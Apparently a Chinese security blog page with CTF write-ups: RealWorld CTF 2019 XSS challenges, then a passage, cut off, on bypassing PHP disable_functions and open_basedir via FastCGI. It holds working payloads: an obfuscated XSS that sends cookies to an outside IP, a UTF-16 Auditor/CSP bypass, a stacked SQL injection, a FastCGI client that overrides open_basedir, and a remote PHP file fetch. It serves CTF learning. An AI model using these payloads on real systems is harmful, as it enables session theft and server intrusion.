<pre><code>http://52.52.236.217:16401/?tag=a%3d1attrs%3donmouserover%3d1%2526onfocus%3dalert(1)%2526id%3d1%2526tabindex%3d0#1</code></pre><p><img src="http://static.zybuluo.com/1160307775/guipvs8t8hxfv0rxvm7hvjse/image_1dksundi8iu3lrfhnnpkunra2d.png" alt="image_1dksundi8iu3lrfhnnpkunra2d.png-249.6kB"></p>
<p>接着就是常规打cookie到本地</p>
<pre><code>http://52.52.236.217:16401/?tag=a=attrs=onmouseover=1%2526onfocus=eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,49,51,57,46,49,57,57,46,50,48,51,46,50,53,51,58,49,50,51,52,47,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))%2526id=1%2526tabindex=0#1</code></pre><h2 id="Hcorme"><a href="#Hcorme" class="headerlink" title="Hcorme"></a>Hcorme</h2><h3 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h3><p>首先题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。这点其实在日常的web应用种并不多见，大多数callback的mime都是javascript</p>
<p><img src="http://static.zybuluo.com/1160307775/ieklsfj1adpr8wcyfwcp6k29/image_1dkseq56a1q3f111911ftas01les9.png" alt="image_1dkseq56a1q3f111911ftas01les9.png-111.3kB"></p>
<p>于此同时题目有两个难点需要bypass：</p>
<ul>
<li>XSS Auditor的限制<br><img src="http://static.zybuluo.com/1160307775/i0q4o5jr15jip56ufv4qbx5b/image_1dksf8oneelujp2n651k3a1qbu13.png" alt="image_1dksf8oneelujp2n651k3a1qbu13.png-183.7kB"></li>
</ul>
<ul>
<li>CSP的限制<pre><code>Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></pre></li>
</ul>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>先着眼xss auditor这个点，在Chrome78以后XSS-Auditor被Chrome自家砍掉了，虽然auditor曾是不少xsser在面对反射性XSS时候的难题，但随着bypass的方法也日益增多，auditor的弊远远大于利：因为auditor在触发的时候会删除恶意输入，之前我博客中有一篇文章<a href="https://hpdoger.cn/2019/07/02/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/">前端全局变量劫持</a>，就能够利用Auditor达到变量劫持的目的。</p>
<p>于此同时Bypass auditor也算是出题人给我们的Hint。</p>
<p>当时我的思路是用字符集去bypass，也就是下面这种思路<br><img src="http://static.zybuluo.com/1160307775/urr4wey9p4wqrnt88qknu6el/image_1dksffho3ttit161ctftckbo61g.png" alt="image_1dksffho3ttit161ctftckbo61g.png-62.5kB"></p>
<p>因为auditor的核心思路就是拿浏览器的渲染和我们的输入做比较，不相符则不会被Check。不过chrome77已经不存在iso-2022-jp这种绕过的方法。接下来我们看一下Hardold师傅的思路–&gt;<strong>utf-16编码绕过</strong></p>
<p>这里串一个编码的知识点，通常我们看到%xx%xx这类的url编码，其实是用16进制表示的，比如utf-8编码形式如下</p>
<pre><code>&gt;&gt;&gt; from urllib.parse import quote,unquote
&gt;&gt;&gt; print(quote((&#39;猪&#39;).encode(&#39;utf-8&#39;)))
&gt;&gt;&gt; %E7%8C%AA</code></pre><p>那么”猪”这个字在utf-8编码下就是<code>0xe7 0x8c 0xaa</code>，下面我们来看一下utf-16编码下的”猪”怎么表示</p>
<pre><code>&gt;&gt;&gt; from urllib.parse import quote,unquote
&gt;&gt;&gt; print(quote((&#39;猪&#39;).encode(&#39;utf-16&#39;)))
&gt;&gt;&gt; %FF%FE%2As</code></pre><p>这时会发现，用utf-16无论编码什么字符，前两个字节都是``0xff0xfe`<br><img src="http://static.zybuluo.com/1160307775/hw1p5epypji3hs4ceofrjada/image_1dksl9ssig0pv2l1f171qr31c5q1t.png" alt="image_1dksl9ssig0pv2l1f171qr31c5q1t.png-98.4kB"></p>
<p>因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。</p>
<p>此时我们来尝试一下能否Bypass XSS Auditor</p>
<pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))

%FF%FE%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00%28%001%00%29%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><p><img src="http://static.zybuluo.com/1160307775/wosh7er7qz9zoevz5m9lv3tx/image_1dksm95e81qka1ts9meii2m1cd92q.png" alt="image_1dksm95e81qka1ts9meii2m1cd92q.png-227.5kB"></p>
<p>成功插入标签，接下来到了第二步，Bypass CSP。因为锁了default-src又没有给unsafe-inline，但是题目有一个jsonp的点，不难想到今年的那道<a href="https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere" target="_blank" rel="noopener">ins’hack 2019/的bypasses-everywhere</a></p>
<p>这篇文章的大意相当于利用jsonp直接把js代码”挂载”到本地的script标签里面，从而导致的bypass。那么我们编写一个demo看看</p>
<pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script/src=?callback=alert(1)&gt;&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))

%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00a%00l%00e%00r%00t%00%28%001%00%29%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><p>可以看到进行了两次资源请求，第二次的资源的执行类型是script<br><img src="http://static.zybuluo.com/1160307775/jo3855qgvjiy2kl23v5m050f/image_1dkssc09a13h01mnh8561rft1g0u9.png" alt="image_1dkssc09a13h01mnh8561rft1g0u9.png-154.8kB"></p>
<p>接着就是把flag打到自己的本地就行了</p>
<pre><code>&gt;&gt;&gt; print(quote((&quot;&lt;script/src=?callback=window.location=&#39;http://xxx/?&#39;%2bdocument.cookie%0a//&gt;&lt;/script&gt;&quot;).encode(&#39;utf-16&#39;)))

%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00w%00i%00n%00d%00o%00w%00.%00l%00o%00c%00a%00t%00i%00o%00n%00%3D%00%27%00h%00t%00t%00p%00%3A%00/%00/%00x%00x%00x%00/%00%3F%00%27%00%25%002%00b%00d%00o%00c%00u%00m%00e%00n%00t%00.%00c%00o%00o%00k%00i%00e%00%25%000%00a%00/%00/%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><h2 id="比赛总结"><a href="#比赛总结" class="headerlink" title="比赛总结"></a>比赛总结</h2><p>赛题质量真心高，膜Harlold师傅，日常拿0day打比赛..orz</p>

                
            </div>
            <div class="continue">
            <a href="/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/09/17/从一道CTF学习Fastcgi绕过姿势/"> 
                    从一道CTF学习Fastcgi绕过姿势 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-09-17   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="从一道CTF学习Fastcgi绕过姿势"><a href="#从一道CTF学习Fastcgi绕过姿势" class="headerlink" title="从一道CTF学习Fastcgi绕过姿势"></a>从一道CTF学习Fastcgi绕过姿势</h1><p>原文首发于安全客:<a href="https://www.anquanke.com/post/id/186186" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186186</a></p>
<p>周末做了一个字节跳动的CTF比赛，其中blog这道题涉及到了disable_functions和open_basedir的限制。在0CTF中出现了类似的考法，给了命令执行点去Bypass Disable_functions&amp;Open_basedir，以前没有做过相关的题，这次记录一下思路和用到的脚本。</p>
<p>关于0CTF的题解，参考飘零师傅：<a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">深入浅出LD_PRELOAD &amp; putenv()</a></p>
<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>当然这题不像0ctf上来就给了你命令执行点，要挖掘一下。简单记一下wp，这部分不细讲。首先是给了全部的源码，在replace.php页面有一个重要功能</p>
<p><img src="http://static.zybuluo.com/1160307775/zojwvlchmoeamdiicqepfg7n/image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png" alt="image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png-429.4kB"></p>
<p>题目的PHP环境是5.3.3所以<code>preg_replace</code>函数是存在一个代码执行的，正好参数又是可控，$replace部分将会被当作php代码执行。</p>
<p>只不过需要先从库里执行这样一句话:<code>$sql-&gt;query(&quot;select isvip from users where id=&quot; . $_SESSION[&#39;id&#39;] . &quot;;&quot;)</code>取校验是否isvip==1，默认注册的所有用户isvip==0。</p>
<p>通过某种方式改变自己的<code>isvip</code>字段，看了下config.php出题人还上了一个waf，直接注入基本不可能。但是它没有过滤SET这个关键词，而且PDO在php5.3以后是支持多条查询的，这给我们堆叠注入创造了机会。<br><img src="http://static.zybuluo.com/1160307775/6cr621hta58y7gic89n0acyf/image_1dkakdh2q164i1hfok7m12koug44g.png" alt="image_1dkakdh2q164i1hfok7m12koug44g.png-440.4kB"></p>
<p>在<code>edit.php</code>有一个很典型的二次注入，太长时间没接触一时没看出来。虽然$title在第一次入库时是经过了addslashes，但是在mysql存储的时候并不会加入<code>\</code>，导致<code>edit.php</code>页面引入之前存储的title字段产生成二次注入。<br><img src="http://static.zybuluo.com/1160307775/eiuxvnfo96iboan9shzwvql4/image_1dkakhsvmfcsqck1pkabm5dgj4t.png" alt="image_1dkakhsvmfcsqck1pkabm5dgj4t.png-405.6kB"></p>
<p>直接贴payload，注入语句用16进制代替在@SQL中了，这种绕过思路在强网杯的题目上也有用到。也可以用concat()+16进制单字符绕。</p>
<pre><code>hpdoger&#39;;SET @SQL=0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227;PREPARE pord FROM @SQL;EXECUTE pord;# 

0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227
=&gt;
UPDATE users SET isvip=1 WHERE username=&#39;hpdoger&#39;</code></pre><p>isvip==1就能代码执行了，phpinfo()看了一下，有disable_funcions和open_basedir的限制，而且过滤跟0CTF那道题很相似，但是没有安装Imagick拓展<br><img src="http://static.zybuluo.com/1160307775/7u4yy60zxzdd21m1tsqdrk2i/image_1dkakvbks1m3dlh01vaarvb17l85n.png" alt="image_1dkakvbks1m3dlh01vaarvb17l85n.png-266.2kB"></p>
<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail</code></pre><h2 id="什么是FastCGI和FPM"><a href="#什么是FastCGI和FPM" class="headerlink" title="什么是FastCGI和FPM"></a>什么是FastCGI和FPM</h2><p>举个例子，如果我们请求index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。Web Server 一般指Apache、Nginx、IIS、Lighttpd、Tomcat等服务器<br><img src="http://static.zybuluo.com/1160307775/69lriwpxmlxmybbhn5u7a0we/image_1dkah71fj1l9u4mu2gfsd2q6d9.png" alt="image_1dkah71fj1l9u4mu2gfsd2q6d9.png-61.5kB"></p>
<h3 id="CGI-amp-FastCGI"><a href="#CGI-amp-FastCGI" class="headerlink" title="CGI&amp;FastCGI"></a>CGI&amp;FastCGI</h3><p>CGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与PHP应用进行“交谈”的一种工具。WEB服务器会传哪些数据给PHP解析器呢？URL、查询字符串、POST数据、HTTP header都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。</p>
<p>FastCGI是用来提高CGI程序性能的。类似于CGI，<strong>FastCGI也可以说是一种协议</strong>。简单来说就是CGI的优化：对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。还有一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。</p>
<p>FastCGI的工作原理如下：<br><img src="http://static.zybuluo.com/1160307775/9a80mehqfymaajjef8zfagch/image_1dkahc1jogup1l5v1dlr9qe1c1n26.png" alt="image_1dkahc1jogup1l5v1dlr9qe1c1n26.png-88.7kB"></p>
<p>1、Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等)</p>
<p>2、FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。</p>
<p>3、当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。</p>
<p>4、FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。 在CGI模式中，php-cgi在此便退出了。</p>
<h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><p>FPM(php-fastcgi program manager)顾名思义，这是一个PHP专用的 fastcgi 管理器。也就是说，PHP-FPM 是对于 FastCGI 协议的具体实现，他负责管理一个进程池，来处理来自Web服务器的请求。目前，PHP5.3版本之后，PHP-FPM是内置于PHP的。因为PHP-CGI只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理。所以就出现了一些能够调度 php-cgi 进程的程序，比如说由lighthttpd分离出来的spawn-fcgi。同样，PHP-FPM也是用于调度管理PHP解析器php-cgi的管理程序。</p>
<h2 id="open-basedir的绕过"><a href="#open-basedir的绕过" class="headerlink" title="open_basedir的绕过"></a>open_basedir的绕过</h2><p>前提是我们能够执行一段php程序来伪造FastCGI.php</p>
<p>在PHP中：</p>
<ul>
<li><p>可以通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：<code>$php_value = &quot;open_basedir = /&quot;;</code></p>
</li>
<li><p>因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir</p>
</li>
</ul>
<h3 id="FastCGI脚本"><a href="#FastCGI脚本" class="headerlink" title="FastCGI脚本"></a>FastCGI脚本</h3><pre><code>&lt;?php
class TimedOutException extends \Exception {
}
class ForbiddenException extends \Exception {
}
class Client {
const VERSION_1 = 1;
const BEGIN_REQUEST = 1;
const ABORT_REQUEST = 2;
const END_REQUEST = 3;
const PARAMS = 4;
const STDIN = 5;
const STDOUT = 6;
const STDERR = 7;
const DATA = 8;
const GET_VALUES = 9;
const GET_VALUES_RESULT = 10;
const UNKNOWN_TYPE = 11;
const MAXTYPE = self::UNKNOWN_TYPE;
const RESPONDER = 1;
const AUTHORIZER = 2;
const FILTER = 3;
const REQUEST_COMPLETE = 0;
const CANT_MPX_CONN = 1;
const OVERLOADED = 2;
const UNKNOWN_ROLE = 3;
const MAX_CONNS = &#39;MAX_CONNS&#39;;
const MAX_REQS = &#39;MAX_REQS&#39;;
const MPXS_CONNS = &#39;MPXS_CONNS&#39;;
const HEADER_LEN = 8;
const REQ_STATE_WRITTEN = 1;
const REQ_STATE_OK = 2;
const REQ_STATE_ERR = 3;
const REQ_STATE_TIMED_OUT = 4;
private $_sock = null;
private $_host = null;
private $_port = null;
private $_keepAlive = false;
private $_requests = array();
private $_persistentSocket = false;
private $_connectTimeout = 5000;
private $_readWriteTimeout = 5000;
public function __construct( $host, $port ) {
    $this-&gt;_host = $host;
    $this-&gt;_port = $port;
}
public function setKeepAlive( $b ) {
          $this-&gt;_keepAlive = (boolean) $b;
          if ( ! $this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock ) {
              fclose( $this-&gt;_sock );
    }
}
public function getKeepAlive() {
    return $this-&gt;_keepAlive;
}
public function setPersistentSocket( $b ) {
          $was_persistent          = ( $this-&gt;_sock &amp;&amp; $this-&gt;_persistentSocket );
          $this-&gt;_persistentSocket = (boolean) $b;
          if ( ! $this-&gt;_persistentSocket &amp;&amp; $was_persistent ) {
              fclose( $this-&gt;_sock );
    }
}
public function getPersistentSocket() {
    return $this-&gt;_persistentSocket;
}
public function setConnectTimeout( $timeoutMs ) {
          $this-&gt;_connectTimeout = $timeoutMs;
}
public function getConnectTimeout() {
    return $this-&gt;_connectTimeout;
}
public function setReadWriteTimeout( $timeoutMs ) {
          $this-&gt;_readWriteTimeout = $timeoutMs;
          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
}
public function getReadWriteTimeout() {
    return $this-&gt;_readWriteTimeout;
}
private function set_ms_timeout( $timeoutMs ) {
          if ( ! $this-&gt;_sock ) {
        return false;
    }
    return stream_set_timeout( $this-&gt;_sock, floor( $timeoutMs / 1000 ), ( $timeoutMs % 1000 ) * 1000 );
}
private function connect() {
    if ( ! $this-&gt;_sock ) {
              if ( $this-&gt;_persistentSocket ) {
                  $this-&gt;_sock = pfsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );
              } else {
                  $this-&gt;_sock = fsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );
              }
              if ( ! $this-&gt;_sock ) {
                  throw new \Exception( &#39;Unable to connect to FastCGI application: &#39; . $errstr );
              }
              if ( ! $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout ) ) {
            throw new \Exception( &#39;Unable to set timeout on socket&#39; );
        }
    }
}
private function buildPacket( $type, $content, $requestId = 1 ) {
          $clen = strlen( $content );
    return chr( self::VERSION_1 )         /* version */
           . chr( $type )                    /* type */
                 . chr( ( $requestId &gt;&gt; 8 ) &amp; 0xFF ) /* requestIdB1 */
           . chr( $requestId &amp; 0xFF )        /* requestIdB0 */
                 . chr( ( $clen &gt;&gt; 8 ) &amp; 0xFF )     /* contentLengthB1 */
           . chr( $clen &amp; 0xFF )             /* contentLengthB0 */
                 . chr( 0 )                        /* paddingLength */
                 . chr( 0 )                        /* reserved */
                 . $content;                     /* content */
}
private function buildNvpair( $name, $value ) {
    $nlen = strlen( $name );
    $vlen = strlen( $value );
    if ( $nlen &lt; 128 ) {
              /* nameLengthB0 */
              $nvpair = chr( $nlen );
          } else {
              /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
              $nvpair = chr( ( $nlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $nlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $nlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $nlen &amp; 0xFF );
          }
          if ( $vlen &lt; 128 ) {
        /* valueLengthB0 */
        $nvpair .= chr( $vlen );
    } else {
        /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
        $nvpair .= chr( ( $vlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $vlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $vlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $vlen &amp; 0xFF );
    }
    /* nameData &amp; valueData */
    return $nvpair . $name . $value;
}
private function readNvpair( $data, $length = null ) {
    $array = array();
          if ( $length === null ) {
        $length = strlen( $data );
    }
    $p = 0;
          while ( $p != $length ) {
              $nlen = ord( $data{$p ++} );
              if ( $nlen &gt;= 128 ) {
                  $nlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );
                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );
                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );
                  $nlen |= ( ord( $data{$p ++} ) );
              }
              $vlen = ord( $data{$p ++} );
              if ( $vlen &gt;= 128 ) {
                  $vlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );
                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );
                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );
                  $vlen |= ( ord( $data{$p ++} ) );
              }
              $array[ substr( $data, $p, $nlen ) ] = substr( $data, $p + $nlen, $vlen );
              $p                                   += ( $nlen + $vlen );
    }
    return $array;
}
private function decodePacketHeader( $data ) {
          $ret                  = array();
          $ret[&#39;version&#39;]       = ord( $data{0} );
          $ret[&#39;type&#39;]          = ord( $data{1} );
          $ret[&#39;requestId&#39;]     = ( ord( $data{2} ) &lt;&lt; 8 ) + ord( $data{3} );
          $ret[&#39;contentLength&#39;] = ( ord( $data{4} ) &lt;&lt; 8 ) + ord( $data{5} );
          $ret[&#39;paddingLength&#39;] = ord( $data{6} );
          $ret[&#39;reserved&#39;]      = ord( $data{7} );
    return $ret;
}
private function readPacket() {
    if ( $packet = fread( $this-&gt;_sock, self::HEADER_LEN ) ) {
        $resp            = $this-&gt;decodePacketHeader( $packet );
              $resp[&#39;content&#39;] = &#39;&#39;;
        if ( $resp[&#39;contentLength&#39;] ) {
                  $len = $resp[&#39;contentLength&#39;];
                  while ( $len &amp;&amp; ( $buf = fread( $this-&gt;_sock, $len ) ) !== false ) {
                      $len             -= strlen( $buf );
                      $resp[&#39;content&#39;] .= $buf;
                  }
              }
              if ( $resp[&#39;paddingLength&#39;] ) {
            $buf = fread( $this-&gt;_sock, $resp[&#39;paddingLength&#39;] );
        }
        return $resp;
    } else {
        return false;
    }
}
public function getValues( array $requestedInfo ) {
          $this-&gt;connect();
          $request = &#39;&#39;;
          foreach ( $requestedInfo as $info ) {
              $request .= $this-&gt;buildNvpair( $info, &#39;&#39; );
          }
          fwrite( $this-&gt;_sock, $this-&gt;buildPacket( self::GET_VALUES, $request, 0 ) );
          $resp = $this-&gt;readPacket();
          if ( $resp[&#39;type&#39;] == self::GET_VALUES_RESULT ) {
              return $this-&gt;readNvpair( $resp[&#39;content&#39;], $resp[&#39;length&#39;] );
    } else {
        throw new \Exception( &#39;Unexpected response type, expecting GET_VALUES_RESULT&#39; );
    }
}
public function request( array $params, $stdin ) {
    $id = $this-&gt;async_request( $params, $stdin );
    return $this-&gt;wait_for_response( $id );
}
public function async_request( array $params, $stdin ) {
    $this-&gt;connect();
          // Pick random number between 1 and max 16 bit unsigned int 65535
          $id = mt_rand( 1, ( 1 &lt;&lt; 16 ) - 1 );
    // Using persistent sockets implies you want them keept alive by server!
    $keepAlive     = intval( $this-&gt;_keepAlive || $this-&gt;_persistentSocket );
          $request       = $this-&gt;buildPacket( self::BEGIN_REQUEST
              , chr( 0 ) . chr( self::RESPONDER ) . chr( $keepAlive ) . str_repeat( chr( 0 ), 5 )
        , $id
          );
          $paramsRequest = &#39;&#39;;
    foreach ( $params as $key =&gt; $value ) {
              $paramsRequest .= $this-&gt;buildNvpair( $key, $value, $id );
          }
          if ( $paramsRequest ) {
        $request .= $this-&gt;buildPacket( self::PARAMS, $paramsRequest, $id );
    }
    $request .= $this-&gt;buildPacket( self::PARAMS, &#39;&#39;, $id );
          if ( $stdin ) {
        $request .= $this-&gt;buildPacket( self::STDIN, $stdin, $id );
    }
    $request .= $this-&gt;buildPacket( self::STDIN, &#39;&#39;, $id );
          if ( fwrite( $this-&gt;_sock, $request ) === false || fflush( $this-&gt;_sock ) === false ) {
        $info = stream_get_meta_data( $this-&gt;_sock );
        if ( $info[&#39;timed_out&#39;] ) {
                  throw new TimedOutException( &#39;Write timed out&#39; );
              }
              // Broken pipe, tear down so future requests might succeed
              fclose( $this-&gt;_sock );
        throw new \Exception( &#39;Failed to write request to socket&#39; );
    }
    $this-&gt;_requests[ $id ] = array(
        &#39;state&#39;    =&gt; self::REQ_STATE_WRITTEN,
        &#39;response&#39; =&gt; null
    );
    return $id;
}
public function wait_for_response( $requestId, $timeoutMs = 0 ) {
    if ( ! isset( $this-&gt;_requests[ $requestId ] ) ) {
        throw new \Exception( &#39;Invalid request id given&#39; );
    }
    if ( $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_OK
         || $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_ERR
    ) {
        return $this-&gt;_requests[ $requestId ][&#39;response&#39;];
    }
    if ( $timeoutMs &gt; 0 ) {
              // Reset timeout on socket for now
              $this-&gt;set_ms_timeout( $timeoutMs );
          } else {
              $timeoutMs = $this-&gt;_readWriteTimeout;
    }
    $startTime = microtime( true );
          do {
              $resp = $this-&gt;readPacket();
              if ( $resp[&#39;type&#39;] == self::STDOUT || $resp[&#39;type&#39;] == self::STDERR ) {
                  if ( $resp[&#39;type&#39;] == self::STDERR ) {
                      $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_ERR;
                  }
                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;response&#39;] .= $resp[&#39;content&#39;];
              }
              if ( $resp[&#39;type&#39;] == self::END_REQUEST ) {
                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_OK;
                  if ( $resp[&#39;requestId&#39;] == $requestId ) {
                      break;
                  }
              }
              if ( microtime( true ) - $startTime &gt;= ( $timeoutMs * 1000 ) ) {
                  // Reset
                  $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
                  throw new \Exception( &#39;Timed out&#39; );
              }
          } while ( $resp );
    if ( ! is_array( $resp ) ) {
              $info = stream_get_meta_data( $this-&gt;_sock );
              // We must reset timeout but it must be AFTER we get info
              $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
              if ( $info[&#39;timed_out&#39;] ) {
                  throw new TimedOutException( &#39;Read timed out&#39; );
              }
              if ( $info[&#39;unread_bytes&#39;] == 0
                   &amp;&amp; $info[&#39;blocked&#39;]
                   &amp;&amp; $info[&#39;eof&#39;] ) {
                  throw new ForbiddenException( &#39;Not in white list. Check listen.allowed_clients.&#39; );
              }
              throw new \Exception( &#39;Read failed&#39; );
          }
          // Reset timeout
          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
          switch ( ord( $resp[&#39;content&#39;]{4} ) ) {
        case self::CANT_MPX_CONN:
            throw new \Exception( &#39;This app can\&#39;t multiplex [CANT_MPX_CONN]&#39; );
            break;
        case self::OVERLOADED:
            throw new \Exception( &#39;New request rejected; too busy [OVERLOADED]&#39; );
            break;
        case self::UNKNOWN_ROLE:
            throw new \Exception( &#39;Role value not known [UNKNOWN_ROLE]&#39; );
            break;
        case self::REQUEST_COMPLETE:
            return $this-&gt;_requests[ $requestId ][&#39;response&#39;];
    }
}
}
$client    = new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1);
  $php_value = &quot;open_basedir = /&quot;;
$filepath  = &#39;/tmp/readflag.php&#39;;
  $content   = &#39;hpdoger&#39;;
echo $client-&gt;request(
      array(
          &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,
          &#39;REQUEST_METHOD&#39;    =&gt; &#39;POST&#39;,
          &#39;SCRIPT_FILENAME&#39;   =&gt; $filepath,
    &#39;SERVER_SOFTWARE&#39;   =&gt; &#39;php/fcgiclient&#39;,
    &#39;REMOTE_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
    &#39;REMOTE_PORT&#39;       =&gt; &#39;9985&#39;,
    &#39;SERVER_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
    &#39;SERVER_PORT&#39;       =&gt; &#39;80&#39;,
    &#39;SERVER_NAME&#39;       =&gt; &#39;mag-tured&#39;,
    &#39;SERVER_PROTOCOL&#39;   =&gt; &#39;HTTP/1.1&#39;,
    &#39;CONTENT_TYPE&#39;      =&gt; &#39;application/x-www-form-urlencoded&#39;,
    &#39;CONTENT_LENGTH&#39;    =&gt; strlen( $content ),
          &#39;PHP_VALUE&#39;         =&gt; $php_value,
),
$content
);</code></pre><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>回到这个题目，首先我们找到P神有一篇文章<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHP绕过open_basedir列目录的研究</a></p>
<p>上传一个php到/tmp下，包含之后列一下根目录存在哪些文件</p>
<pre><code>copy(&#39;http://vps/log2.txt&#39;,&#39;/tmp/scandir.php&#39;）

*lo2.txt*=&gt;
&lt;?php
$file_list = array();
// normal files
$it = new DirectoryIterator(&quot;glob:///*&quot;);
foreach($it as $f) {
    $file_list[] = $f-&gt;__toString();
}
// special files (starting with a dot(.))
$it = new DirectoryIterator(&quot;glob:///.*&quot;);
foreach($it as $f) {
    $file_list[] = $f-&gt;__toString();
}
sort($file_list);
foreach($file_list as $f){
